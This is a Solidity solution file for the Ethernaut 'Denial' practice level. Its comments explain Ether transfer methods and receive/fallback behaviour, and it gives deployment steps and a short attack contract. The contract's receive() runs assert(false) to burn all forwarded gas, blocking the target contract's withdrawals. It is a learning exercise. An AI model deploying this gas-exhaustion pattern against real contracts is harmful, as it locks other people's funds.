/* Tools needed for this level:
- Console
- Remix IDE

-------SEND--------
You can send Ether to other contracts with any of these three methods:

a) ".transfer": Forwards 2300 gas to the contract being called for emitting an event.
If failed, reverts and throws error if receiving contract does not have a fallback 
or receive function. Receiver address must be payable.

b) ".send": Similar to .transfer , sends 2300 gas but returns bool instead of reverting.
Receiver ddress must be payable.

c) ".call" : Allows to call a function on another contract. The amount of gas can be 
specified. Returns bool. Does not require receiver address to be payable. Sends back the
state of transaction and the data returned from the funtion call (bool, bytes). Forwards
all remaining gas to called contract.

  .call{value: msg.value}("function_signature") ---> With a signature, it will call a 
  function
  .call{value: msg.value}("")  ---> If there is no signature, it will transfer ETH.

-------RECEIVE-------
A contract can receive ETH by having at least one of the functions below:
- receive() external payable {}
- fallback() external payable {}

receive() is called if msg.data is empty, otherwise fallback() is called.

-------ERROR--------
"require" and "revert": They undo the changes made and refund the gas.
"assert":  In Solidity 0.6.0, it consumes the entire gas supply and the state is 
then reversed to the original state.

1.- Deploy this contract (DenialAttack) with Remix using injected web3 environment.

2.- Call the setWithdrawPartner() function of Ethernaut's Denial contract, passing the address
of deployed DenialAttack:
  await contract.setWithdrawPartner("0x9244159aAeed8Be3c7C44E2C15573d5efEf30c59")
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract DenialAttack {
	// This will be executed on partner.call{value:amountToSend}(""), and since its assertion
	// is false, it will consume all gas, making it impossible to get to the next line
	// (owner.transfer(amountToSend);)
	receive() external payable {
		assert(false);
	}
}
